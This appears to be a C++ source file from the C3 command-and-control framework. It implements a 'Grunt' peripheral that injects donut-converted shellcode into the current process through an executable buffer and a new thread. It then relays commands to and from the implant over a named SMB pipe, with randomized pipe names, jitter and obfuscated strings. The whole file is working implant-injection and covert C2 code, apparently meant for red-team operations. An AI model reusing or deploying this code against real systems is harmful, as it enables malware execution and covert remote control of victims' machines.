#include "StdAfx.h"
#include "Grunt.h"

FSecure::C3::Interfaces::Peripherals::Grunt::Grunt(ByteView arguments)
{
	auto [pipeName, payload, connectAttempts] = arguments.Read<std::string, ByteVector, uint32_t>();

	// Arguments validation.
	if (payload.empty())
		throw std::invalid_argument(OBF("There was no payload provided."));

	if (pipeName.empty() || !connectAttempts)
		throw std::invalid_argument(OBF("Cannot establish connection with payload with provided parameters"));

	// Originally we were setting up the CLR for our .NET assembly, now we're using donut'd shellcode
	// we can just inject as with a beacon
	WinTools::InjectionBuffer m_BeaconStager(payload);

	namespace SEH = FSecure::WinTools::StructuredExceptionHandling;
	DWORD(WINAPI * sehWrapper)(SEH::CodePointer) = SEH::SehWrapper;
	FlushInstructionCache(GetCurrentProcess(), m_BeaconStager.Get(), payload.size());

	// Inject the payload stage into the current process.
	if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(sehWrapper), m_BeaconStager.Get(), 0, nullptr))
		throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };

	std::this_thread::sleep_for(std::chrono::milliseconds{ 1000 }); // Give Grunt thread time to start pipe.
	for (auto i = 0u; i < connectAttempts; i++)
	{
		try
		{
			m_Pipe = WinTools::AlternatingPipe{ ByteView{ pipeName } };
			return;
		}
		catch (std::exception& e)
		{
			// Sleep between trials.
			Log({ OBF_SEC("Grunt constructor: ") + e.what(), LogMessage::Severity::DebugInformation });
			std::this_thread::sleep_for(std::chrono::milliseconds{ 100 });
		}
	}

	throw std::runtime_error{ OBF("Grunt creation failed") };
}

void FSecure::C3::Interfaces::Peripherals::Grunt::OnCommandFromConnector(ByteView data)
{
	m_SendQueue.emplace_back(data);
}

FSecure::ByteVector FSecure::C3::Interfaces::Peripherals::Grunt::OnReceiveFromPeripheral()
{
	std::unique_lock<std::mutex> lock{ m_Mutex };
	FSecure::ByteVector ret = {};
	if (m_Close)
	{
		lock.unlock();
		return ret;
	}

	// Commands to Send
	if (!m_SendQueue.empty())
	{
		auto msg = std::move(m_SendQueue.front());
		m_SendQueue.pop_front();
		m_Pipe->WriteCov(msg);
		// Give it some time to process
	}

	// Read
	if (m_Pipe->PeakCov())
	{
		ret = m_Pipe->ReadCov();
	}

	lock.unlock();
	return ret;
}

void FSecure::C3::Interfaces::Peripherals::Grunt::Close()
{
	FSecure::C3::Device::Close();
	m_Close = true;
}


const char* FSecure::C3::Interfaces::Peripherals::Grunt::GetCapability()
{
	return R"(
{
	"create":
	{
		"arguments":
		[
			{
				"type": "string",
				"name": "Pipe name",
				"min": 4,
				"randomize": true,
				"description": "Name of the pipe Beacon uses for communication."
			},
			{
				"type": "int32",
				"min": 1,
				"defaultValue" : 30,
				"name": "Delay",
				"description": "Delay"
			},
			{
				"type": "int32",
				"min": 0,
				"defaultValue" : 30,
				"name": "Jitter",
				"description": "Jitter"
			},
			{
				"type": "int32",
				"min": 10,
				"defaultValue" : 30,
				"name": "Connect Attempts",
				"description": "Number of attempts to connect to SMB Pipe"
			}
		]
	},
	"commands": []
}
)";
}